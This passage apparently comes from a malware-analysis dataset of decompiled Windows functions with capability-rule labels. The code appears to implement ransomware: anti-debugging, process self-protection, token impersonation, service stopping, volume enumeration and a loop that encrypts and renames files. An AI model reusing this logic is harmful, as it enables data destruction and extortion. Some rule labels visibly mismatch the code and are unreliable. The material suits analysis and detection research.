= *param_2;\n        piVar7 = param_2;\n        while (iVar1 != 0) {\n            piVar7 = piVar7 + 1;\n            iVar5 = iVar5 + 1;\n            iVar1 = *piVar7;\n        }\n    }\n    iVar5 = (*_sym.imp.ADVAPI32.dll_RegSetValueExW)(hKey, piVar8, 0, 1, param_2, iVar5 * 2);\n    bVar9 = iVar5 == 0;\ncode_r0x00411e22:\n    (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n    return bVar9;\n}\n",
        "token_count": 1129
    },
    "00412550": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00412550(int16_t *param_1)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    if (param_1 != NULL) {\n        iVar1 = *param_1;\n        while (iVar1 != 0) {\n            param_1 = param_1 + 1;\n            iVar2 = iVar2 + 1;\n            iVar1 = *param_1;\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 113
    },
    "00412570": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00412570(char *param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    if (param_1 != NULL) {\n        cVar1 = *param_1;\n        while (cVar1 != '\\0') {\n            param_1 = param_1 + 1;\n            iVar2 = iVar2 + 1;\n            cVar1 = *param_1;\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 113
    },
    "00412a80": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00412b0b)\n// WARNING: Removing unreachable block (ram,0x00412a91)\n\nuint fcn.00412a80(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    bool bVar3;\n    bool bVar4;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    piVar1 = cpuid_basic_info(0);\n    if (0 < *piVar1) {\n        bVar3 = true;\n        bVar4 = true;\n        if (((piVar1[1] != 0x756e6547) || (piVar1[2] != 0x49656e69)) || (piVar1[3] != 0x6c65746e)) {\n            bVar3 = false;\n        }\n        if (((piVar1[1] != 0x68747541) || (piVar1[2] != 0x69746e65)) || (piVar1[3] != 0x444d4163)) {\n            bVar4 = false;\n        }\n        if (((bVar3) || (bVar4)) && (iVar2 = cpuid_Version_info(1),  (*(iVar2 + 0xc) & 0x2000000) != 0)) {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 323
    },
    "00416800": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00416800(uint param_1, uint param_2)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    int32_t iVar6;\n    uint arg_8h;\n    int32_t in_FS_OFFSET;\n    uint lpServiceStatus;\n    int32_t var_60h;\n    uint dwMilliseconds;\n    int32_t var_30h;\n    int32_t iStack48;\n    int32_t iStack44;\n    int32_t iStack40;\n    int32_t var_20h;\n    uint hSCManager;\n    int32_t var_18h;\n    int32_t *var_14h;\n    uint32_t var_10h;\n    int32_t *ptr;\n    uint32_t var_8h;\n    uint size;\n    \n    pcVar2 = _sym.imp.KERNEL32.dll_GetTickCount;\n    hSCManager = param_2;\n    var_18h = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n    pcVar1 = _sym.imp.ADVAPI32.dll_EnumDependentServicesA;\n    iVar3 = (*_sym.imp.ADVAPI32.dll_EnumDependentServicesA)(param_1, 1, 0, 0, &size, &var_8h);\n    if (iVar3 != 0) {\n        return 1;\n    }\n    if ((*(in_FS_OFFSET + 0x34) == 0xea) && (ptr = (*_sym.imp.msvcrt.dll_malloc)(size),  ptr != NULL)) {\n        fcn.004124f0(ptr, 0, size);\n        iVar4 = (*pcVar1)(param_1, 1, ptr, size, &size, &var_8h);\n        iVar3 = var_18h;\n        if (iVar4 != 0) {\n            var_10h = 0;\n            piVar5 = ptr;\n            if (var_8h != 0) {\n                do {\n                    var_18h = *piVar5;\n                    var_30h = piVar5[4];\n                    iStack48 = piVar5[5];\n                    iStack44 = piVar5[6];\n                    iStack40 = piVar5[7];\n                    var_20h = piVar5[8];\n                    var_14h = piVar5;\n                    iVar4 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(hSCManager, var_18h, 0x24);\n                    if (iVar4 == 0) {\n                        return 0;\n                    }\n                    iVar6 = (*_sym.imp.ADVAPI32.dll_ControlService)(iVar4, 1, &lpServiceStatus);\n                    if (iVar6 == 0) {\n                        return 0;\n                    }\n                    while (var_60h != 1) {\n                        (*_sym.imp.KERNEL32.dll_Sleep)(dwMilliseconds);\n                        iVar6 = (*_sym.imp.ADVAPI32.dll_QueryServiceStatusEx)(iVar4, 0, &lpServiceStatus, 0x24, &size);\n                        if (iVar6 == 0) {\n                            return 0;\n                        }\n                        if (var_60h == 1) {\n                            var_30h = *0x423e50;\n                            iStack48 = *0x423e54;\n                            iStack44 = *0x423e58;\n                            iStack40 = *0x423e5c;\n                            var_20h = 0x717065;\n                            iVar6 = var_18h;\n                            arg_8h = fcn.00401da0();\n                            fcn.0040f630(arg_8h, iVar6);\n                            break;\n                        }\n                        iVar6 = (*pcVar2)();\n                        if (30000 < iVar6 - iVar3) {\n                            return 0;\n                        }\n                    }\n                    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar4);\n                    var_10h = var_10h + 1;\n                    var_14h = var_14h + 9;\n                    piVar5 = var_14h;\n                } while (var_10h < var_8h);\n            }\n            (*_sym.imp.msvcrt.dll_free)(ptr);\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 950
    },
    "null": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid entry0(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint arg_8h;\n    int32_t iVar6;\n    uint uVar7;\n    int32_t iVar8;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint extraout_ECX_01;\n    code *pcVar9;\n    code *pcVar10;\n    int32_t in_FS_OFFSET;\n    ulong uVar11;\n    char *pcVar12;\n    uint var_390h;\n    uint var_188h;\n    uint var_106h;\n    uint var_c3h;\n    uint var_9eh;\n    uint var_7ch;\n    uint var_78h;\n    uint var_68h;\n    uint var_61h;\n    uint uStack97;\n    uint uStack93;\n    uint uStack89;\n    uchar var_51h;\n    uint var_50h;\n    uint32_t var_4ch;\n    int32_t var_48h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    uint32_t TokenInformation;\n    uint32_t ReturnLength;\n    int32_t TokenHandle;\n    uint var_1ch;\n    uchar var_15h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if ((*(*(in_FS_OFFSET + 0x30) + 0x68) & 0x70) != 0) {\n        (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\n    }\n    fcn.00416990();\n    (*_sym.imp.ntdll.dll_RtlInitializeCriticalSection)(0x426948);\n    fcn.0040fdb0();\n    pcVar9 = _sym.imp.KERNEL32.dll_CreateThread;\n    iVar2 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.0040f800, 0, 0, &var_38h);\n    pcVar10 = _sym.imp.ntdll.dll_NtSetInformationThread;\n    if (iVar2 != -1) {\n        (*_sym.imp.ntdll.dll_NtSetInformationThread)(iVar2, 0x11, 0, 0);\n    }\n    (*_sym.imp.KERNEL32.dll_Sleep)(200);\n    iVar2 = fcn.0041aa00();\n    if (iVar2 == 0) {\n        var_2ch = iVar2;\n        fcn.00412680();\n        if ((var_2ch == 1) && (cVar1 = (*_sym.imp.KERNEL32.dll_GetVersion)(),  cVar1 != '\\x05')) {\n            fcn.004124f0(&var_390h, 0, 0x208);\n            uVar11 = fcn.00412550();\n            fcn.004124d0(&var_390h, uVar11 >> 0x20, uVar11 * 2);\n            fcn.0041a8e0();\n            fcn.0041a740();\n            (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\n        }\n        pcVar12 = \"Process created with limited rights\";\n        fcn.00404090(\"Process created with limited rights\");\n        uVar3 = fcn.004023c0();\n        fcn.0040f630(uVar3, pcVar12);\n    }\n    iVar2 = fcn.00412870();\n    if (iVar2 != 0) {\n        (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\n    }\n    fcn.00416b00();\n    var_40h = *(in_FS_OFFSET + 0x20);\n    var_1ch = 0;\n    var_4h = 0;\n    var_8h = 0;\n    var_14h = 0;\n    var_10h._0_2_ = 0x100;\n    var_7ch = 0x18;\n    _var_78h = ZEXT816(0);\n    var_68h = 0;\n    var_3ch = 0;\n    uVar4 = (*_sym.imp.ntdll.dll_NtOpenProcess)(&var_4h, 0x60000, &var_7ch, &var_40h);\n    if ((uVar4 & 0xc0000000) != 0xc0000000) {\n        if (var_4h == 0) goto code_r0x004170cb;\n        iVar2 = (*_sym.imp.ADVAPI32.dll_GetSecurityInfo)(var_4h, 6, 4, 0, 0, &var_1ch, 0, 0);\n        if ((iVar2 == 0) &&\n           (iVar2 = (*_sym.imp.ntdll.dll_RtlAllocateAndInitializeSid)(&var_14h, 1, 0, 0, 0, 0, 0, 0, 0, 0, &var_8h), \n           iVar2 != 0)) {\n            (*_sym.imp.ntdll.dll_RtlQueryInformationAcl)(var_1ch, &var_4ch, 0xc, 2);\n            iVar2 = (*_sym.imp.ntdll.dll_RtlLengthSid)(var_8h);\n            iVar2 = var_48h + 0x10 + iVar2 * 2;\n            iVar5 = (*_sym.imp.msvcrt.dll_malloc)(iVar2);\n            pcVar10 = _sym.imp.ntdll.dll_NtSetInformationThread;\n            if (iVar5 != 0) {\n                iVar2 = (*_sym.imp.ntdll.dll_RtlCreateAcl)(iVar5, iVar2, 4);\n                if ((iVar2 != 0) &&\n                   (iVar2 = (*_sym.imp.ntdll.dll_RtlAddAccessDeniedAce)(iVar5, 4, 1, var_8h), \n                   pcVar9 = _sym.imp.ntdll.dll_RtlGetAce,  iVar2 != 0)) {\n                    uVar4 = 0;\n                    if (var_4ch != 0) {\n                        do {\n                            var_30h = 0;\n                            iVar2 = (*pcVar9)(var_1ch, uVar4, &var_30h);\n                            if ((iVar2 == 0) ||\n                               (iVar2 = (*_sym.imp.ntdll.dll_RtlAddAce)(iVar5, 4, 0xffffffff, var_30h, *(var_30h + 2)), \n                               iVar2 == 0)) goto code_r0x004170a7;\n                            uVar4 = uVar4 + 1;\n                        } while (uVar4 < var_4ch);\n                    }\n                    (*_sym.imp.ADVAPI32.dll_SetSecurityInfo)(var_4h, 6, 4, 0, 0, iVar5, 0);\n                }\ncode_r0x004170a7:\n                (*_sym.imp.msvcrt.dll_free)(iVar5);\n                pcVar9 = _sym.imp.KERNEL32.dll_CreateThread;\n                pcVar10 = _sym.imp.ntdll.dll_NtSetInformationThread;\n            }\n        }\n    }\n    if (var_4h != 0) {\n        (*_sym.imp.ntdll.dll_NtClose)(var_4h);\n    }\ncode_r0x004170cb:\n    if (var_8h != 0) {\n        (*_sym.imp.ntdll.dll_RtlFreeSid)(var_8h);\n    }\n    var_34h = 7;\n    (*_sym.imp.ntdll.dll_NtSetInformationProcess)(0xffffffff, 0xc, &var_34h, 4);\n    (*_sym.imp.ntdll.dll_RtlAdjustPrivilege)(9, 1, 0, &var_15h);\n    TokenHandle = 0;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(8, &TokenHandle);\n    iVar5 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar3);\n    iVar2 = 0;\n    if (iVar5 != 0) {\n        ReturnLength = 4;\n        iVar5 = (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(TokenHandle, 0x14, &TokenInformation, 4, &ReturnLength);\n        if (iVar5 != 0) {\n            iVar2 = TokenInformation;\n        }\n    }\n    if (TokenHandle != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n    }\n    uVar3 = 0;\n    iVar5 = (*pcVar9)(0, 0, fcn.004174d0, 0, 0, &var_50h);\n    if (iVar5 != -1) {\n        (*pcVar10)(iVar5, 0x11, 0, 0);\n    }\n    iVar5 = var_ch;\n    if ((iVar2 != 0) && (iVar5 = (*pcVar9)(0, 0, fcn.00412b40, 0, 0, &var_ch),  iVar5 != -1)) {\n        (*pcVar10)(iVar5, 0x11, 0, 0);\n    }\n    iVar2 = fcn.00419330();\n    if (iVar2 == 0) {\n        uVar7 = extraout_ECX;\n        fcn.00403fc0(extraout_ECX, var_ch);\n        arg_8h = fcn.00403f40();\n        fcn.0040f630(arg_8h, uVar7);\n        (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\n    }\n    pcVar9 = _sym.imp.KERNEL32.dll_GetTickCount;\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n    fcn.0040fe80();\n    iVar6 = (*pcVar9)();\n    var_51h = 0;\n    var_61h = *0x423dc0;\n    uStack97 = *0x423dc4;\n    uStack93 = *0x423dc8;\n    uStack89 = *0x423dcc;\n    uVar4 = (iVar6 - iVar2) % 86400000;\n    ReturnLength = uVar4 / 3600000;\n    uVar4 = uVar4 % 3600000;\n    TokenInformation = uVar4 / 60000;\n    uVar7 = fcn.004020b0();\n    fcn.0040f630(uVar7, uVar3);\n    fcn.00401a90(extraout_ECX_00, var_ch);\n    pcVar12 = fcn.00401480();\n    if (pcVar12 != NULL) {\n        cVar1 = *pcVar12;\n        while (cVar1 != '\\0') {\n            pcVar12 = pcVar12 + 1;\n            cVar1 = *pcVar12;\n        }\n    }\n    fcn.00411e40();\n    fcn.00411a80();\n    fcn.00416b00();\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetConsoleWindow)();\n    iVar8 = (*_sym.imp.USER32.dll_IsWindowVisible)(uVar3);\n    if (iVar8 != 0) {\n        uVar3 = extraout_ECX_01;\n        fcn.00404010(extraout_ECX_01, var_ch, (iVar6 - iVar2) / 86400000, ReturnLength, TokenInformation, \n                     (uVar4 % 60000) / 1000);\n        uVar7 = fcn.00403f80();\n        fcn.0040f630(uVar7, uVar3);\n        fcn.00412590();\n    }\n    (*_sym.imp.ntdll.dll_NtWaitForSingleObject)(iVar5, 0, 0);\n    fcn.00416ce0();\n    (*_sym.imp.KERNEL32.dll_ExitProcess)(0x309);\n    pcVar9 = swi(3);\n    (*pcVar9)();\n    return;\n}\n",
        "token_count": 2713
    },
    "004172f0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.004172f0(uint param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t in_FS_OFFSET;\n    uint ARG_0;\n    uint ARG_1;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t lpcchReturnLength;\n    \n    pcVar1 = _sym.imp.msvcrt.dll_malloc;\n    lpcchReturnLength = 0x209;\n    iVar2 = (*_sym.imp.msvcrt.dll_malloc)(0x412);\n    if (iVar2 != 0) {\n        while( true ) {\n            iVar3 = (*_sym.imp.KERNEL32.dll_GetVolumePathNamesForVolumeNameW)\n                              (param_1, iVar2, lpcchReturnLength, &lpcchReturnLength);\n            if ((iVar3 != 0) || (*(in_FS_OFFSET + 0x34) != 0xea)) break;\n            (*_sym.imp.msvcrt.dll_free)(iVar2);\n            iVar2 = (*pcVar1)(lpcchReturnLength * 2);\n            if (iVar2 == 0) {\n                return;\n            }\n        }\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetDriveTypeW)(param_1);\n        if (((iVar3 == 2) || (iVar3 == 3)) && (lpcchReturnLength < 3)) {\n            ARG_1 = 0x730025;\n            var_8h._0_2_ = 0;\n            var_18h = 0x62005c;\n            var_14h = 0x6f006f;\n            var_10h = 0x6d0074;\n            var_ch = 0x720067;\n            (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, &ARG_1, param_1);\n            iVar3 = (*_sym.imp.KERNEL32.dll_CreateFileW)(&ARG_0, 0x80000000, 3, 0, 3, 0x80, 0);\n            if (iVar3 == -1) {\n                fcn.00417400();\n            }\n            else {\n                (*_sym.imp.ntdll.dll_NtClose)(iVar3);\n            }\n        }\n        if (iVar2 != 0) {\n            (*_sym.imp.msvcrt.dll_free)(iVar2);\n        }\n    }\n    return;\n}\n",
        "token_count": 562
    },
    "004174d0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.004174d0(void)\n\n{\n    uint *puVar1;\n    int16_t iVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint var_410h;\n    uint var_208h;\n    int16_t var_204h;\n    int16_t var_202h;\n    uchar var_200h [512];\n    \n    iVar4 = (*_sym.imp.KERNEL32.dll_FindFirstVolumeW)(&var_208h, 0x104);\n    pcVar3 = _sym.imp.KERNEL32.dll_FindNextVolumeW;\n    if (iVar4 == -1) {\n        return 0;\n    }\n    do {\n        puVar1 = &var_208h;\n        iVar7 = 0;\n        iVar2 = var_208h;\n        while (iVar2 != 0) {\n            puVar1 = puVar1 + 2;\n            iVar7 = iVar7 + 1;\n            iVar2 = *puVar1;\n        }\n        iVar7 = iVar7 + -1;\n        if ((((var_208h != 0x5c) || (var_208h._2_2_ != 0x5c)) || (var_204h != 0x3f)) ||\n           ((var_202h != 0x5c || (*(&var_208h + iVar7 * 2) != 0x5c)))) break;\n        *(&var_208h + iVar7 * 2) = 0;\n        iVar5 = (*_sym.imp.KERNEL32.dll_QueryDosDeviceW)(var_200h, &var_410h, 0x104);\n        *(&var_208h + iVar7 * 2) = 0x5c;\n        if (iVar5 == 0) break;\n        fcn.004172f0();\n        iVar7 = (*pcVar3)(iVar4, &var_208h, 0x104);\n    } while (iVar7 != 0);\n    (*_sym.imp.KERNEL32.dll_FindVolumeClose)(iVar4);\n    (*_sym.imp.KERNEL32.dll_ExitThread)(0);\n    pcVar3 = swi(3);\n    uVar6 = (*pcVar3)();\n    return uVar6;\n}\n",
        "token_count": 511
    },
    "004175d0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004175d0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint var_178h;\n    uint var_174h;\n    uint var_170h;\n    uint TokenInformation;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint ReturnLength;\n    uint var_10h;\n    int32_t var_ch;\n    uint DuplicateTokenHandle;\n    uint ExistingTokenHandle;\n    \n    uVar5 = 0;\n    var_10h = 0;\n    iVar2 = (*_sym.imp.KERNEL32.dll_CreateToolhelp32Snapshot)(2, 0);\n    if (iVar2 != -1) {\n        var_178h = 0x128;\n        fcn.004124f0(&var_174h, 0, 0x124);\n        var_ch = 0;\n        iVar3 = (*_sym.imp.KERNEL32.dll_Process32First)(iVar2, &var_178h);\n        pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n        while (iVar3 != 0) {\n            iVar3 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x1000, 0, var_170h);\n            if (iVar3 != 0) {\n                iVar4 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(iVar3, 10, &ExistingTokenHandle);\n                if (iVar4 != 0) {\n                    iVar4 = (*_sym.imp.ADVAPI32.dll_GetTokenInformation)\n                                      (ExistingTokenHandle, 10, &TokenInformation, 0x38, &ReturnLength);\n                    if (((iVar4 != 0) && (var_48h == arg_8h)) && (var_44h == arg_ch)) {\n                        var_ch = 1;\n                        iVar4 = (*_sym.imp.ADVAPI32.dll_DuplicateToken)(ExistingTokenHandle, 2, &DuplicateTokenHandle);\n                        if (iVar4 != 0) {\n                            var_10h = (*_sym.imp.ADVAPI32.dll_SetThreadToken)(0, DuplicateTokenHandle);\n                            (*pcVar1)(DuplicateTokenHandle);\n                        }\n                    }\n                    (*pcVar1)(ExistingTokenHandle);\n                }\n                (*pcVar1)(iVar3);\n                uVar5 = var_10h;\n                if (var_ch != 0) break;\n            }\n            iVar3 = (*_sym.imp.KERNEL32.dll_Process32Next)(iVar2, &var_178h);\n            uVar5 = var_10h;\n        }\n        (*pcVar1)(iVar2);\n    }\n    return uVar5;\n}\n",
        "token_count": 607
    },
    "00417790": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint fcn.00417790(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint uStack100;\n    uchar *puStack96;\n    uint uStack92;\n    uint uStack88;\n    uchar *puStack84;\n    uchar auStack72 [68];\n    \n    puStack84 = &stack0xffffffb8;\n    uStack88 = 8;\n    uStack92 = 0xffffffff;\n    puStack96 = 0x4177a9;\n    iVar2 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)();\n    pcVar1 = _sym.imp.ADVAPI32.dll_GetTokenInformation;\n    if (iVar2 != 0) {\n        puStack96 = &stack0xffffffb0;\n        uStack100 = 4;\n        iVar4 = 0x12;\n        iVar2 = (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(puStack84);\n        if ((iVar2 != 0) && (iVar4 == 2)) {\n            iVar2 = (*pcVar1)(&stack0xffffffa8, 0x13, &stack0xffffff94, 4, &stack0xffffff9c);\n            if (iVar2 != 0) {\n                uVar3 = 10;\n                iVar2 = (*pcVar1)(iVar4, 10, &stack0xffffffa0, 0x38, &stack0xffffff9c);\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar3);\n                if (iVar2 != 0) {\n                    iVar2 = fcn.004175d0(uStack88, puStack84);\n                    if (iVar2 != 0) {\n                        return 1;\n                    }\n                }\n            }\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(&stack0xffffffa8);\n    }\n    return 0;\n}\n",
        "token_count": 417
    },
    "004180b0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004180b0(void)\n\n{\n    uint32_t *puVar1;\n    uint *puVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    code *pcVar6;\n    int32_t iVar7;\n    char cVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    int32_t *piVar11;\n    int32_t iVar12;\n    int32_t *piVar13;\n    uint32_t uVar14;\n    uchar *unaff_ESI;\n    int32_t in_FS_OFFSET;\n    bool bVar15;\n    uchar *puVar16;\n    uint uVar17;\n    uint uStack680;\n    uint32_t uStack676;\n    uint32_t uStack672;\n    uint32_t uStack668;\n    uint32_t uStack664;\n    uchar auStack660 [8];\n    int32_t iStack652;\n    uchar auStack648 [4];\n    uint32_t uStack644;\n    uint uStack640;\n    uint uStack636;\n    uint uStack632;\n    uint uStack628;\n    uchar auStack616 [612];\n    \n    pcVar6 = _sym.imp.KERNEL32.dll_GlobalFree;\ncode_r0x004180c4:\n    while( true ) {\n        do {\n            iVar9 = (*_sym.imp.ntdll.dll_NtRemoveIoCompletion)(*0x428228, &uStack676, &iStack652, auStack648, 0);\n            iVar7 = iStack652;\n        } while (iVar9 != 0);\n        uStack672 = uStack644;\n        iVar9 = *(iStack652 + 0x24);\n        if (iVar9 == 1) {\n            uStack640 = *(iStack652 + 0x40054);\n            uStack636 = *(iStack652 + 0x40058);\n            uStack632 = *(iStack652 + 0x4005c);\n            uStack628 = *(iStack652 + 0x40060);\n            uStack664 = uStack644 & 0xf;\n            if (*0x428430 == 0) {\n                fcn.00408a80(auStack616);\n                fcn.00408aa0(auStack616, iVar7 + 0x40034, 0x80);\n                uStack668 = uStack664;\n            }\n            else {\n                uStack668 = fcn.0040f370();\n            }\n            if ((uStack672 != 0x40000) && (uStack668 != 0)) {\n                uStack668 = 0x10 - uStack664;\n                uStack664 = uStack668;\n            }\n            uStack668 = uStack668 + uStack672;\n            if (*0x428430 == 0) {\n                iVar9 = fcn.00408960(auStack616, 1, uStack668, &uStack640, iVar7 + 0x34, iVar7 + 0x34);\n                if (iVar9 != 0) goto code_r0x004184bb;\n            }\n            else {\n                fcn.0040f2c0();\n            }\n            if (*(iVar7 + 0x30) == 0) {\n                *(iVar7 + 8) = 0;\n                *(iVar7 + 0xc) = 0;\n                *(iVar7 + 0x24) = 2;\n                uVar14 = uStack668;\n            }\n            else {\n                puVar2 = uStack664 + iVar7 + 0x24 + uStack672;\n                uVar17 = *puVar2;\n                uVar3 = puVar2[1];\n                uVar4 = puVar2[2];\n                uVar5 = puVar2[3];\n                *(iVar7 + 8) = *(iVar7 + 0x28);\n                *(iVar7 + 0x40054) = uVar17;\n                *(iVar7 + 0x40058) = uVar3;\n                *(iVar7 + 0x4005c) = uVar4;\n                *(iVar7 + 0x40060) = uVar5;\n                *(iVar7 + 0xc) = *(iVar7 + 0x2c);\n                *(iVar7 + 0x24) = 5;\n                iVar9 = fcn.00419100(*(iVar7 + 0x18), *(iVar7 + 0x1c));\n                if (iVar9 == 0) {\n                    *(iVar7 + 0x24) = 2;\n                }\n                puVar1 = iVar7 + 0x28;\n                uVar14 = *puVar1;\n                *puVar1 = *puVar1 + uStack676;\n                *(iVar7 + 0x2c) = *(iVar7 + 0x2c) + CARRY4(uVar14, uStack676);\n                uVar14 = uStack676;\n            }\n            iVar9 = (*_sym.imp.KERNEL32.dll_WriteFile)(*(iVar7 + 0x20), iVar7 + 0x34, uVar14, 0, iVar7);\n            goto code_r0x004184a2;\n        }\n        if (iVar9 != 2) break;\n        uStack664 = *(iStack652 + 0x20);\n        puVar16 = auStack660;\n        uVar14 = uStack676;\n        cVar8 = (*_sym.imp.ntdll.dll_RtlDosPathNameToNtPathName_U)(uStack676, puVar16, 0, 0);\n        if (cVar8 != '\\0') {\n            iVar9 = (uStack676 & 0xffff) + 0x10;\n            unaff_ESI = (*_sym.imp.msvcrt.dll_malloc)(iVar9);\n            fcn.004124f0(unaff_ESI, 0, iVar9);\n            if (unaff_ESI != NULL) {\n                fcn.004124d0(unaff_ESI + 0xc, uStack672, uStack676 & 0xffff);\n                *(unaff_ESI + 8) = uStack676 & 0xffff;\n                *unaff_ESI = 0;\n                *(unaff_ESI + 4) = 0;\n                (*_sym.imp.ntdll.dll_NtSetInformationFile)(uStack680, &uStack640, unaff_ESI, iVar9, 10);\n                (*_sym.imp.msvcrt.dll_free)(uVar14);\n            }\n        }\n        fcn.004124f0(iVar7 + 0x40034, 0, 0x30);\n        (*_sym.imp.ntdll.dll_NtClose)(*(iVar7 + 0x20));\n        LOCK();\n        *0x428420 = *0x428420 + -1;\n        (*pcVar6)(iVar7);\n        (*pcVar6)(puVar16);\n    }\n    if (iVar9 != 3) {\n        if (iVar9 != 4) {\n            if (iVar9 != 5) goto code_r0x0041845e;\n            iVar9 = 0x40000;\n            uVar14 = *(iStack652 + 0x28) + 0x40000;\n            *(iStack652 + 0x24) = 1;\n            iVar10 = *(iStack652 + 0x2c) + (0xfffbffff < *(iStack652 + 0x28));\n            iVar12 = *(iStack652 + 0x1c);\n            if ((*(iStack652 + 0x1c) == iVar10 || iVar12 < iVar10) &&\n               ((iVar12 < iVar10 || (*(iStack652 + 0x18) < uVar14 || *(iStack652 + 0x18) == uVar14)))) {\n                iVar9 = *(iStack652 + 0x18) - *(iStack652 + 0x28);\n            }\n            *(iStack652 + 8) = *(iStack652 + 0x28);\n            *(iStack652 + 0xc) = *(iStack652 + 0x2c);\n            goto code_r0x00418495;\n        }\n        piVar11 = iStack652 + 0x34;\n        uStack672 = 0xc;\n        piVar13 = 0x426000;\n        